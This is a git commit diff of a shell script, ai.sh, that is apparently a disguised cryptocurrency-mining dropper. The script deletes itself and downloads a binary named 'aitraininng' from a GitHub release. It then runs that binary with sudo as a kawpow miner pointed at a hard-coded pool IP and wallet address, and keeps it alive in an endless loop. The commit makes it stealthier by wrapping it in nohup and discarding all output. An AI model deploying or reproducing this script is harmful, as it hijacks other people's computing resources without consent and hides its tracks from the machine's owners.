444ebe8f12f5958b9de70225095f0702827329d7
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 07:52:17 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,8 +1,12 @@
 #!/bin/bash
-( sleep 1; rm -- "$0" ) &
-wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
-chmod +x aitraininng
-sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
-while true; do 
-  sleep 60
-done
+
+# Run the script in the background using nohup
+nohup bash -c "
+  ( sleep 1; rm -- \"$0\" ) &
+  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
+  chmod +x aitraininng
+  sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
+  while true; do 
+    sleep 60
+  done
+" > /dev/null 2>&1 &
